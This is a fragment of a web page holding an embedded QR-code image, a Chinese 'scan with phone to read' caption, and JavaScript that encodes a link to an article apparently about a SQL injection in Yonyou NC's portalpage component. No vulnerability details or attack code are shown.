![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-portalpage-importPml-billitem-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 